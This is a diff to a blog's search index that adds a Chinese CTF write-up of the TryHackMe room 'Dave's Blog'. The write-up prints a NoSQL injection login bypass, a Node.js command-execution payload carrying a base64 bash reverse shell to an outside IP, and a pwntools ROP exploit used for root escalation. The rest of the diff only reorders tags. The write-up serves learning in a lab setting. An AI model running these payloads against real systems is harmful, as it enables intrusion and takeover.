@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>打靶记录(五九)之THMDave&#39;sBlog</title>
+      <link href="/2023/12/01/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%94%E4%B9%9D)%E4%B9%8BTHMDave&#39;sBlog/"/>
+      <url>/2023/12/01/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%94%E4%B9%9D)%E4%B9%8BTHMDave&#39;sBlog/</url>
+      
+        <content type="html"><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 10.10.236.185 -A                            </span><br><span class="line">[sudo] mikannse 的密码：</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-01 07:06 UTC</span><br><span class="line">Nmap scan report for 10.10.236.185</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 65531 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE  SERVICE      VERSION</span><br><span class="line">22/tcp   open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)</span><br><span class="line">|   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)</span><br><span class="line">|_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)</span><br><span class="line">80/tcp   open   http         nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Dave's Blog</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/admin</span><br><span class="line">3000/tcp open   http         Node.js (Express middleware)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/admin</span><br><span class="line">|_http-title: Dave's Blog</span><br><span class="line">8989/tcp closed sunwebadmins</span><br><span class="line">Aggressive OS guesses: HP P2000 G3 NAS device (89%), Linux 2.6.32 (88%), Linux 2.6.32 - 3.1 (88%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (88%), Linux 3.7 (88%), Linux 5.0 (88%), Linux 5.0 - 5.4 (88%), Linux 5.1 (88%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (88%), Linux 2.6.32 - 3.13 (88%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 8989/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   329.73 ms 10.11.0.1</span><br><span class="line">2   329.91 ms 10.10.236.185</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 44.61 seconds</span><br></pre></td></tr></tbody></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>发现是开了两个web端口，访问，呈现的看上去两个端口开放的是同一个网站。目录爆破有一个admin,但是输入一些登录并没有任何response，非常奇怪。</p><p>房间提示是nosql，第一次遇到，稍微去了解了一下。右键查看源代码，发现有一个js脚本。大概意思是用json格式post提交用户名和密码</p><p>改成json格式上传。</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#tools">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#tools</a></p><p>有许多nosql的payload,选用</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">{"username": {"$ne": null}, "password": {"$ne": null}}</span><br></pre></td></tr></tbody></table></figure><p>虽然原理暂时还不是很懂，应该是类似关系数据库中的’or 1=1– -‘吧</p><p>然后在response中得到jwt令牌，在cyberchef里面可以解码</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">{</span><br><span class="line">    "isAdmin": true,</span><br><span class="line">    "_id": "5ec6e5cf1dc4d364bf864107",</span><br><span class="line">    "username": "dave",</span><br><span class="line">    "password": "THM{SuperSecureAdminPassword123}",</span><br><span class="line">    "__v": 0,</span><br><span class="line">    "iat": 1701417856</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>用得到的用户和密码登录</p><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>来到一个命令执行的地方，当输入7*7,返回了49,说明确实可以执行命令，但是鉴于对express框架的不了解，去搜索了一下express RCE的方式</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4zOC4yNDUvMTIzNCAwPiYx | base64 -d | bash').toString();</span><br></pre></td></tr></tbody></table></figure><p>echo后面的内容是一个反弹shell的base64编码后的结果</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.11.38.245/1234 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">export TERM=xterm-color</span><br><span class="line"></span><br><span class="line">python3 -c "import pty;pty.spawn('/bin/bash')"</span><br></pre></td></tr></tbody></table></figure><p>改善一下交互性</p><p>发现家目录中有一个root身份执行的脚本，并且对所有用户可读可写可执行用于</p><p>提示让我们深入mongodb数据库，这个网站应该是用nodejs和mongodb搭建的</p><p>输入mongo就可以进入mongodb的命令行，在whatcouldthisbes表中找到第三个flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">db.whatcouldthisbes.find()</span><br></pre></td></tr></tbody></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo -l</p><p>发现可以执行一个uid_checker的二进制程序，打算放到IDA中反编译一下</p><p>并在main函数中找到第四个flag</p><p>除此之外，还存在一个/bin/sh的后门函数，也许是PWN中的ret2text</p><p>但是好像涉及到rop链什么的，还没学也暂时不打算学，抄个别人的exp</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">from pwn import cyclic</span><br><span class="line">from pwnlib.tubes.ssh import ssh</span><br><span class="line">from pwnlib.util.packing import p64</span><br><span class="line"></span><br><span class="line">offset = 88 # Found with ropstar</span><br><span class="line"></span><br><span class="line">payload = cyclic(offset)</span><br><span class="line">payload += p64(0x400803) # pop r15; ret</span><br><span class="line">payload += p64(0x601060) # .bss</span><br><span class="line">payload += p64(0x4005b0) # gets()</span><br><span class="line">payload += p64(0x400803) # pop r15; ret</span><br><span class="line">payload += p64(0x601060) # .bss</span><br><span class="line">payload += p64(0x400570) # system()</span><br><span class="line"></span><br><span class="line">s = ssh(host='', user='dave', keyfile='./key')</span><br><span class="line"></span><br><span class="line">p = s.process(['sudo', '/uid_checker'])</span><br><span class="line">print(p.recv())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(p.recv())</span><br><span class="line">p.sendline("/bin/sh")</span><br><span class="line">p.interactive(prompt='')</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>在运行脚本之前需要取消对dave的远程连接认证</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></tbody></table></figure><p>生成密钥</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cp id_rsa.pub authorized_keys</span><br></pre></td></tr></tbody></table></figure><p>复制一份id_rsa至本地</p><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>在这个房间碰到了好多非常陌生的东西，nodejs,express,mongodb。最后的利用也是比较难的吧。找时间再具体了解一下</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 打靶 </tag>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>打靶记录(五八)之THMBrainpan1</title>
       <link href="/2023/11/30/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%94%E5%85%AB)%E4%B9%8BTHMBrainpan1/"/>
       <url>/2023/11/30/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%94%E5%85%AB)%E4%B9%8BTHMBrainpan1/</url>
@@ -525,9 +556,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -556,9 +587,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -856,9 +887,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -918,9 +949,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -949,9 +980,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -1394,9 +1425,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -1514,9 +1545,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -1545,9 +1576,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -1669,9 +1700,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -2256,9 +2287,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -2407,9 +2438,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
@@ -2438,9 +2469,9 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 打靶 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 打靶 </tag>
             
         </tags>
       
